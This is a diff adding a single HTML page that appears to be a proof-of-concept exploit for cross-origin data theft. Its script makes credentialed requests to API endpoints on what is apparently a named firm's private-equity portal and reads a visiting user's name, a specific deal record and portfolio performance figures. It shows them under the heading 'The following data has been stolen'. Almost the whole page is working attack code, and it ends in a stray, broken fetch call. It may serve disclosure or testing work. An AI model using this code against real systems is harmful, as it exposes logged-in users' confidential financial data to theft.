@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>title</title>
+  </head>
+  <body>
+    <p>Hi <span id="user"></span>. The following data has been stolen</p>
+    <p id="result">Loading</p>
+    <p>The following deal information has also been stolen</p>
+    <p id="deal">Loading...</p>
+
+    <script>
+      var body = {
+        Name: "Aggregated",
+        Queries: [
+          {
+            Name: "Data",
+            Fields: [
+              "Market Value",
+              "Portfolio Size",
+              "IRR Horizon",
+              "MOC",
+              "DPI",
+              "IRR",
+              "Cum. DVA - No Cash (Hedged USD)",
+              "Commitment",
+              "Drawdown",
+              "Undrawn Commitment",
+              "Distribution",
+              "Gain/Loss",
+              "As At Date"
+            ],
+            Filters: {
+              "As At Date": { values: ["2018-12-31"] },
+              Currency: { values: ["USD"] },
+              Horizon: { values: ["Since Incept"] },
+              "Is Aborted Deal": { values: ["NO"] },
+              Strategy: { values: ["PE"] }
+            }
+          }
+        ]
+      };
+
+      function msg(e) {
+        var result = e[0].Total[0].Metrics;
+
+        document.getElementById("result").innerHTML =
+          "<pre>" + JSON.stringify(result, undefined, 2) + "</pre>";
+      }
+
+      fetch("https://pelive.gic.com.sg/cube/api/v1/User", {
+        credentials: "include"
+      }).then(resp =>
+        resp.json().then(e => {
+          document.getElementById("user").innerHTML = e.name;
+        })
+      );
+
+      fetch(
+        "https://pelive.gic.com.sg/dtracker/odata/v1.0/dealInvestments?%24filter=id%20eq%20%27DT0000004%27",
+        { credentials: "include" }
+      ).then(resp =>
+        resp.json().then(e => {
+          document.getElementById("deal").innerHTML =
+            "<pre>" + JSON.stringify(e.value[0], undefined, 2) + "</pre>";
+        })
+      );
+
+      fetch("https://pelive.gic.com.sg/cube/api/v1/SIX", {
+        credentials: "include",
+        body: JSON.stringify(body),
+        method: "POST",
+        headers: {
+          Accept: "application/json",
+          "Content-Type": "application/json; charset=utf-8"
+        }
+      }).then(resp => resp.json().then(msg));
+
+      fetch("https");
+    </script>
+  </body>
+</html>
